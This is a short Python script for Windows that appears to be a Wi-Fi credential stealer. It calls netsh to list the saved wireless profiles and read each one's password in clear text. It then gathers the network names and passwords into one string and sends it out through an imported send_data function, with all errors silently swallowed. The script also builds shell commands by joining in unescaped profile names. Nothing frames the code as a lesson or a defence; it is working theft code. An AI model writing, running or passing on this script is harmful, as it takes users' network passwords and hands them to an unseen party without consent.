import subprocess
from web_connection import send_data
import random


def show_profiles():
    output = subprocess.check_output("netsh wlan show profiles")
    output = output.splitlines()
    i = 0
    wifi_names = []
    while i < len(output):
        if ": " in output[i].decode():
            wifi_name = output[i].decode().rsplit(": ", 1)[1]
            wifi_names.append(wifi_name)
        i += 1

    i = 0
    return wifi_names


def find_key(wifi):
    output = subprocess.check_output("netsh wlan show profile " + wifi + " KEY=CLEAR")
    output = output.splitlines()
    key = ""
    i = 0
    while i < len(output):
        if "Key Content            : " in output[i].decode():
            key = output[i].decode().rsplit(": ", 1)[1]
        i += 1
    return key


if __name__ == "__main__":
    wifis = show_profiles()
    final_string = ""
    for wifi in wifis:
        key = find_key(wifi)
        final_string += "Wifi Name: " + wifi + "   Wifi Password: " + key + "\n"
    try:
        print(final_string)
        send_data(final_string)
    except:
        pass
